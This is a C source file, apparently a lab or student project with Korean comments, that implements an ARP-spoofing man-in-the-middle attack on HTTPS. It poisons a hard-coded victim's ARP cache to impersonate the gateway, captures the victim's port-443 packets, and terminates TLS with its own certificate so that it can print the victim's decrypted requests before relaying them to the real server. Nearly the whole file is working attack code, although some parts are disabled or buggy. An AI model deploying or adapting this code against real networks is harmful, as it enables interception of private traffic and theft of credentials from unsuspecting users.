//gcc -Wall -o proxy proxy.c -L/usr/lib -lssl -lcrypto -lpcap -lpthread
//proxy.c
#include <errno.h>
#include <unistd.h>
#include <malloc.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <resolv.h>
#include "openssl/ssl.h"
#include "openssl/err.h"

#include <stdio.h>
#include <netdb.h>

#include<pcap.h>
#include<stdlib.h> // for exit()
	
//#include<arpa/inet.h> // for inet_ntoa()
#include<net/ethernet.h> //linux/ether.h - ethhdr declaration
#include<netinet/ip_icmp.h>   //Provides declarations for icmp header
#include<netinet/udp.h>   //Provides declarations for udp header
#include<netinet/tcp.h>   //Provides declarations for tcp header
#include<netinet/ip.h>    //Provides declarations for ip header
#include <libnet.h>

#define FAIL    -1

#define VICTIM_IP "192.168.230.130"
#define LOOPBACK "127.0.0.1"
#define GATEWAY_IP "192.168.230.2"
typedef unsigned char uchar;

// ARP header
struct arp_hdr
{
	ushort	ar_hrd;		// Hardware type : ethernet
	ushort	ar_pro;     // Protocol		 : IP
	uchar	ar_hln;     // Hardware size
	uchar	ar_pln;     // Protocal size
	ushort	ar_op;      // Opcode replay
	uchar	ar_sha[6];  // Sender MAC
	uchar	ar_sip[4];  // Sender IP
	uchar	ar_tha[6];  // Target mac
	uchar	ar_tip[4];  // Target IP
};

//arp
void* arp_func(void *args) //스레드 함수
{
//	ADDR_PAKAGE *addr_pak = (ADDR_PAKAGE*)args;
	//스레드가 수행할 함수 ARP Spoofing
	uint8_t packet[42];
	int i;

	struct ethhdr* eth_ptr = (struct ethhdr*)packet;
	struct arp_hdr* arp_ptr = (struct arp_hdr*)(packet + sizeof(*eth_ptr));


	uint8_t victim_mac[ETH_ALEN] = {0x00, 0x0c, 0x29, 0x4c, 0x00, 0x4f};
	uint8_t proxy_mac[ETH_ALEN] = {0x00, 0x0c, 0x29, 0xab, 0x96, 0x08};

	unsigned int*temp;
	pcap_t* handle=(pcap_t*)args;


	for (i = 0; i < ETH_ALEN; i++)
		eth_ptr->h_dest[i] = victim_mac[i];

	for (i = 0; i < ETH_ALEN;i++)
		eth_ptr->h_source[i] = proxy_mac[i];

	eth_ptr->h_proto = htons(ETHERTYPE_ARP); //0806
	#define HW_ETHER 0x0001
	#define PROTO_IPV4 0x0800
	#define OP_REPLY 0x0002
	arp_ptr->ar_hrd = htons(HW_ETHER); //0001
	arp_ptr->ar_pro = htons(PROTO_IPV4); //0800
	arp_ptr->ar_hln = ETH_ALEN;
	arp_ptr->ar_pln = 4; //IPv4_LEN
	arp_ptr->ar_op = htons(OP_REPLY); //0002

	for (i = 0; i < ETH_ALEN; i++)
		arp_ptr->ar_sha[i] = proxy_mac[i];
	temp=arp_ptr->ar_sip;
	*temp=inet_addr(GATEWAY_IP);

	printf("arp : %s %x\n", GATEWAY_IP, htonl(*temp));

	for (i = 0; i < ETH_ALEN; i++)
		arp_ptr->ar_tha[i] = victim_mac[i];
	temp=arp_ptr->ar_tip;
	*temp=inet_addr(VICTIM_IP);

	while (1)
	{
//		printf("ARP Spoofing...\n");
		if(pcap_sendpacket(handle, (const u_char *)packet, 42)==-1)
			perror("ARP Spoof");
		sleep(2);
	}
}

//V-P
u_short ip_checksum(u_char * buff, u_short len_ip_header)
{
        u_short word16;
        u_int sum = 0;
        u_short i;
        // make 16 bit words out of every two adjacent 8 bit words in the packet
        // and add them up
        for( i = 0; i < len_ip_header; i = i+2 )
        {
                word16 = (buff[i]<<8) + buff[i+1];
//		printf("word : 0x%x %d\n", word16, i);
                sum = sum + (u_int) word16;
//		printf("sum : 0x%x\n", sum);
        }
        // take only 16 bits out of the 32 bit sum and add up the carries
        while( sum >> 16 )
                sum = ( sum & 0xFFFF ) + ( sum >> 16 );
        // one's complement the result
        sum = ~sum;

        return ntohs((u_short) sum);
}

void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *buffer)
{

	//callback
	struct ethhdr *ethh;
	struct iphdr *iph;
	struct tcphdr *tcph;

	int size = header->len;

	pcap_t *lohandle = (pcap_t*)args;
	
	ethh = (struct ethhdr*)(buffer);
	if(ntohs(ethh->h_proto) == ETHERTYPE_IP)
	{
		struct sockaddr_in addr;
		char* src_addr;
		
		//Get the IP Header part of this packet , excluding the ethernet header
		iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
		addr.sin_addr.s_addr=iph->saddr;
		src_addr=inet_ntoa(addr.sin_addr);
		//printf("%x %x\n", iph->protocol, IPPROTO_TCP);
		if(iph->protocol == IPPROTO_TCP) //u_int8_t
		{
			tcph=(struct tcphdr*)(buffer+sizeof(struct ethhdr)+iph->ihl*4);
			if(strcmp(src_addr,VICTIM_IP) == 0 && ntohs(tcph->th_dport) == 443)
			{
				printf("packet : %x\n", htonl(iph->saddr));
//				int i;
//				for(i=0;i<20;i++)
//					printf("0x%x : 0x%x\n", (((u_int8_t*)iph)+i), *((u_int8_t*)iph+i));
//				printf("before : 0x%x\n", iph->check);
				iph->saddr=inet_addr(LOOPBACK);
				iph->check=0;
				iph->check=ip_checksum((u_char*)iph, iph->ihl*4);
//				printf("cksum : 0x%x\n", iph->check);
				//if dst_portnum is not 443, you must fix that and tcp_cksum
				//packet rela
				if(0)//pcap_sendpacket(lohandle, const u_char *buffer, size)==-1)
				{
					pcap_perror(lohandle, "send");
					abort();
				}
			}
		}
	}

}

int pcap_main()
{

	pcap_if_t *alldevsp , *device;
	pcap_t *handle;
	pcap_t *lohandle; //Handle of the device that shall be sniffed
	
	char errbuf[100] , *devname , devs[100][100];
	int count = 1 , n;

	pthread_t thread;
	int iret;
	
	//First get the list of available devices
	printf("Finding available devices ... ");
	if( pcap_findalldevs( &alldevsp , errbuf) )
	{
		printf("Error finding devices : %s" , errbuf);
		exit(1);
	}
	printf("Done");
	
	//Print the available devices
	printf("\nAvailable Devices are :\n");
	for(device = alldevsp ; device != NULL ; device = device->next)
	{
		printf("%d. %s - %s\n" , count , device->name , device->description);
		if(device->name != NULL)
		{
			strcpy(devs[count] , device->name);
		}
		count++;
	}
	
	//Ask user which device to sniff
	printf("Enter the number of the device you want to sniff : ");
	scanf("%d" , &n);
	devname = devs[n];
	
	//Open the device for sniffing
	printf("Opening device %s for sniffing ... " , devname);
	handle = pcap_open_live(devname , 65536 , 1 , 0 , errbuf);
	
	if (handle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s : %s\n" , devname , errbuf);
		exit(1);
	}
	printf("Done\n");

	//Ask user which device to sniff
	printf("Enter the number of the localhost device  : ");
	scanf("%d" , &n);
	devname = devs[n];
	
	//Open the device for sniffing
	printf("Opening device %s for sniffing ... " , devname);
	lohandle = pcap_open_live(devname , 65536 , 1 , 0 , errbuf);
	
	if (lohandle == NULL) 
	{
		fprintf(stderr, "Couldn't open device %s : %s\n" , devname , errbuf);
		exit(1);
	}
	printf("Done\n");

	
//	logfile=fopen("log.txt","w");
//	if(logfile==NULL) 
//	{
//		printf("Unable to create file.");
//	}
	
	//ARP Thread
	iret = pthread_create( &thread, NULL, arp_func, (void*)handle);
	if(iret)
	     perror("pthread_create");
	
	//Put the device in sniff loop
	pcap_loop(handle , -1 , process_packet , (u_char*)lohandle);
	
	return 0;

}



//realy function
int OpenConnection_relay(const char *hostname, int port)
{
	int relay_sock;
	struct hostent *host;
	struct sockaddr_in addr;
	
	if ( (host = gethostbyname(hostname)) == NULL )
	{
		perror(hostname);
	}
	relay_sock = socket(PF_INET, SOCK_STREAM, 0);
	bzero(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = *(long*)(host->h_addr);
	if ( connect(relay_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
	{
		close(relay_sock);
		perror(hostname);
	}
	return relay_sock;
}

int OpenListener(int port)
{
	int listen_sock;
	struct sockaddr_in addr;

//TIME_WAIT PROTECT
	struct linger   ling;
	ling.l_onoff = 1;
ling.l_linger = 0; //0 for abortive disconnect

listen_sock = socket(PF_INET, SOCK_STREAM, 0);
setsockopt(listen_sock, SOL_SOCKET, SO_LINGER, &ling, sizeof(ling));
bzero(&addr, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr.s_addr = INADDR_ANY;
if ( bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr)) != 0 )
{
	perror("can't bind port");
	abort();
}
if ( listen(listen_sock, 10) != 0 )
{
	perror("Can't configure listening port");
	abort();
}
return listen_sock;
}

SSL_CTX* InitServerCTX(void)
{   SSL_METHOD *method;
	SSL_CTX *ctx;

	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();
	method = TLSv1_2_method();
	ctx = SSL_CTX_new(method);
	if ( ctx == NULL )
	{
		ERR_print_errors_fp(stderr);
		abort();
	}
	return ctx;
}

void LoadCertificates(SSL_CTX* ctx, char* CertFile, char* KeyFile)
{
	if ( SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0 )
	{
		perror("loadcertificates1");
		ERR_print_errors_fp(stderr);
		abort();
	}
	if ( SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0 )
	{
		perror("loadcertificates2");
		ERR_print_errors_fp(stderr);
		abort();
	}
	if ( !SSL_CTX_check_private_key(ctx) )
	{
		fprintf(stderr, "Private key does not match the public certificate\n");
		abort();
	}
}

void ShowCerts(SSL* ssl)
{
	X509 *cert;
	char *line;

	cert = SSL_get_peer_certificate(ssl);
	if ( cert != NULL )
	{
		printf("Server certificates:\n");
		line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
		printf("Subject: %s\n", line);
		free(line);
		line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
		printf("Issuer: %s\n", line);
		free(line);
		X509_free(cert);
	}
	else
		printf("No certificates.\n");
}

void Servlet(SSL* ssl, SSL_CTX *ctx)
{
	char buf[65535];
	int bytes;

//relay
	int relay_sock;
	char* hostname1;
	char hostname2[65535];
	SSL *ssl_relay;
	ShowCerts(ssl);

	int count=0;

	if ( SSL_accept(ssl) == FAIL )
	{
		perror("ssl_accept");
		ERR_print_errors_fp(stderr);
	}
	else
	{
		while(1)
		{
			printf("Wait For Victim...\n\n");
			memset(buf, 0, strlen(buf));
			bytes = SSL_read(ssl, buf, sizeof(buf));
			buf[bytes] = 0;
			printf("From Victim:\n**************************************************\n%s\n**************************************************\n\n", buf);
//relay
			if(strcmp(buf, "exit\r\n\r\n")==0)
			{
				printf("exit...\n");
				break;
			}
			if((hostname1=strstr(buf, "Host: ")) == 0)
			{
				printf("Cannot Found \"Host: \"\n");
				SSL_write(ssl, "Cannot Found \"Host: \"\n", strlen("Cannot Found \"Host: \"\n"));
				continue;
			}
			hostname1=hostname1+6;
			while(*(hostname1+count)!=13)
			{
				count++;
			}
			strncpy(hostname2, hostname1, count);
			relay_sock = OpenConnection_relay(hostname2, 443);
			ssl_relay = SSL_new(ctx);
			SSL_set_fd(ssl_relay, relay_sock);
			if ( SSL_connect(ssl_relay) == FAIL )
			{
				perror("ssl_relay connect");
				ERR_print_errors_fp(stderr);
			}
			printf("Connected with %s encryption\n", SSL_get_cipher(ssl_relay));
			ShowCerts(ssl_relay);
			SSL_write(ssl_relay, buf, strlen(buf));
			bytes = SSL_read(ssl_relay, buf, sizeof(buf));
			SSL_free(ssl_relay);

			if ( bytes > 0 )
			{
				buf[bytes] = 0;
				printf("From Server:\n**************************************************\n%s\n**************************************************\n\n", buf);
				SSL_write(ssl, buf, strlen(buf));
			}
			else
				ERR_print_errors_fp(stderr);
			close(relay_sock);
		}
	}
	SSL_free(ssl);
	SSL_CTX_free(ctx);
}

int main(int argc, char *args[])
{
	SSL_CTX *ctx;
	int listen_sock;
	char *portnum;

	pthread_t thread;
	int iret;

	if ( argc != 2 )
	{
		printf("Usage: %s <portnum>\n", args[0]);
		exit(0);
	}
	portnum = args[1];

	SSL_library_init();

	ctx = InitServerCTX();
	LoadCertificates(ctx, "mycert.pem", "mycert.pem");
	listen_sock = OpenListener(atoi(portnum));

	//pcap thread + ARP Spoofing
	iret = pthread_create( &thread, NULL, pcap_main, NULL);
	if(iret)
	     perror("pthread_create");


	//SSL
	{
		struct sockaddr_in addr;
		socklen_t len = sizeof(addr);
		SSL *ssl;
		
		printf("******************************Listening...******************************\n");

		int accept_sock = accept(listen_sock, (struct sockaddr*)&addr, &len);
		printf("Connection: %s:%d\n",inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));
		ssl = SSL_new(ctx);
		SSL_set_fd(ssl, accept_sock);

		Servlet(ssl, ctx);
	}
	close(listen_sock);
	SSL_CTX_free(ctx);
	return 0;
}
